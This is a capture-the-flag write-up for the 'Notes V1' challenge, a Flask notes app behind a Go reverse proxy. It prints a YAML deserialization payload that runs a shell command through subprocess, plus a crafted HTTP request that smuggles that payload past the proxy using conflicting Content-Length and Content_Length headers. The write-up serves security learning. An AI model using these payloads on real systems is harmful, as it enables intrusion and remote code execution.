# Notes V1

**Description**
  <br>
  Is there more to the Simple Notes app than meets the eye?


**Author:  [L0xm1](https://twitter.com/L0xm1_07)**

**Solution**
<br> 
We are given with a notes-app where we can add notes and edit notes. Lets dive into the source code given.

app.py
```py
from flask import Flask, request, render_template, redirect, url_for
from werkzeug.serving import WSGIRequestHandler
import os 
import yaml
from yaml import *
import uuid
from threading import Thread

app = Flask(__name__)
notes = []


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        title = request.form['title']
        content = request.form['content']
        note_id = str(uuid.uuid4())
        notes.append({'id': note_id, 'title': title, 'content': content})
        return redirect(url_for('index'))
    else:
        return render_template('index.html', notes=notes)

@app.route('/add_note', methods=['POST'])
def add_note():
    title = request.form['title']
    content = request.form['content']
    note_id = str(uuid.uuid4())
    notes.append({'id': note_id, 'title': title, 'content': content})
    return render_template('index.html', notes=notes)

@app.route('/edit_note/<note_id>', methods=['GET', 'POST'])
def edit_note(note_id):
    note = next((note for note in notes if note['id'] == note_id), None)
    if note:
        if request.method == 'POST':
            title = request.form['title']
            content = request.form['content']
            note['title'] = title
            note['content'] = content
            return redirect(url_for('index'))
        else:
            return render_template('edit.html', note=note)
    else:
        return 'Note not found', 404

@app.route('/admin', methods=['GET'])
def serialize():
    data=request.args.get('data')
    if data:
        deserialized=yaml.load(data,Loader=Loader)
        return deserialized
    else:
        return "No data provided"
    
    
if __name__ == '__main__':
    WSGIRequestHandler.protocol_version = "HTTP/1.1"
    app.run(host='0.0.0.0', port=5000, threaded=True, debug=False)

```

In */admin* endpoint, *yaml.load()* is used which is vulnerable to deserialization vulnerability and a user can get RCE.

We can use the following payload to read the flag.
```yaml
!!python/object/apply:subprocess.check_output
args:
- - cat
  - flag.txt

```

But if we look into the go-proxy code, the */admin* endpoint is prohibitted from accessing.


main.go
```go
package main

import (
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
)

type loggingResponseWriter struct {
	http.ResponseWriter
}

func (lrw *loggingResponseWriter) Write(b []byte) (int, error) {
	log.Printf("Response Body: %s\n", string(b))
	return lrw.ResponseWriter.Write(b)
}

func loggingHandler(h http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// log.Printf("Request Headers: %+v\n", r.Header)

		//  Set Connection: keep-alive header in the outgoing request
		//  r.Header.Set("Connection", "keep-alive")

		lrw := &loggingResponseWriter{w}
		h.ServeHTTP(lrw, r)

		// log.Printf("Response Headers: %+v\n", lrw.Header())
	})
}

func main() {
	origin, err := url.Parse("http://localhost:5000")
	if err != nil {
		panic(err)
	}

	proxy := httputil.NewSingleHostReverseProxy(origin)

	http.DefaultTransport.(*http.Transport).MaxIdleConns = 500
	http.DefaultTransport.(*http.Transport).MaxIdleConnsPerHost = 100

	http.Handle("/", loggingHandler(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/admin" {
			http.Error(w, "Access to /admin is prohibited", http.StatusForbidden)
			return
		}
		proxy.ServeHTTP(w, r)
	})))
	log.Println("Server started at :8000...")
	log.Fatal(http.ListenAndServe(":8000", nil))

}
```

We need to bypass the proxy to reach */admin* endpoint and we can get RCE using yaml deserialization vulnerability.

How will we bypass the proxy?

In Werkzeug, underscores (_) are converted to hyphens (-) and interpreted as such. This means that the *Content_Length* header is treated in the same way as Content-Length. So we can give Content-Length and Content_Length, such that the go-proxy will consider only the first Content-Length header, and Werkzeug will consider the second Content_Length header. We can use this trick to smuggle our request to */admin* endpoint, thus bypassing the proxy. 


Combining everything, we can smuggle our request to /admin endpoint using the following request and get the flag.

```
POST / HTTP/1.1
Host: localhost:8000
Content-Length: 151
Content_Length: 0

GET /admin?data=%21%21python%2Fobject%2Fapply%3Asubprocess.check_output%0Aargs%3A%0A-%20-%20cat%0A%20%20-%20flag.txt HTTP/1.1
Host: localhost:8000

GET / HTTP/1.1
Host: localhost:8000

```

*Flag: `shaktictf{c0ngr4ts_y0u_bypassed_the_proxy}`*  

